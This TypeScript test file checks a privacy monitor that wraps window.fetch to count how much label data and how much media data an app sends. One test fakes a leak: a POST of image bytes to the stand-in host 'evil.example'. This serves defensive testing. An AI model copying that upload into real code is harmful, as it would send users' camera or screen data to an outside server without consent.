import { describe, it, expect, beforeEach, afterEach } from "vitest";
import {
  startPrivacyMonitor,
  stopPrivacyMonitor,
  resetPrivacyStat,
  getPrivacyStat,
} from "./monitor";

// The monitor patches window.fetch; stand up a minimal fake window for node.
let calls: Array<[unknown, unknown]>;

beforeEach(() => {
  calls = [];
  (globalThis as unknown as { window: unknown }).window = {
    fetch: (input: unknown, init: unknown) => {
      calls.push([input, init]);
      return Promise.resolve("ok");
    },
  };
  resetPrivacyStat();
});

afterEach(() => {
  stopPrivacyMonitor();
  delete (globalThis as unknown as { window?: unknown }).window;
});

const w = () => (globalThis as unknown as { window: { fetch: typeof fetch } }).window;

describe("privacy monitor", () => {
  it("measures JSON label posts and reports zero media", async () => {
    startPrivacyMonitor();
    const payload = JSON.stringify({ events: [{ s: "focused" }] });
    await w().fetch("/api/signals", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: payload,
    });

    const s = getPrivacyStat();
    expect(s.requests).toBe(1);
    expect(s.labelRequests).toBe(1);
    expect(s.labelBytes).toBe(new TextEncoder().encode(payload).length);
    expect(s.mediaBytes).toBe(0);
    expect(s.mediaRequests).toBe(0);
    // The real request still went through to the underlying fetch.
    expect(calls.length).toBe(1);
  });

  it("flags image/video payloads as media bytes (the leak case)", async () => {
    startPrivacyMonitor();
    await w().fetch("https://evil.example/upload", {
      method: "POST",
      headers: { "content-type": "image/png" },
      body: "pretend-frame-bytes",
    });

    const s = getPrivacyStat();
    expect(s.mediaRequests).toBe(1);
    expect(s.mediaBytes).toBeGreaterThan(0);
    expect(s.labelBytes).toBe(0);
  });

  it("counts non-body GETs as requests with zero bytes", async () => {
    startPrivacyMonitor();
    await w().fetch("/api/debrief");
    const s = getPrivacyStat();
    expect(s.requests).toBe(1);
    expect(s.bytes).toBe(0);
    expect(s.mediaBytes).toBe(0);
  });
});
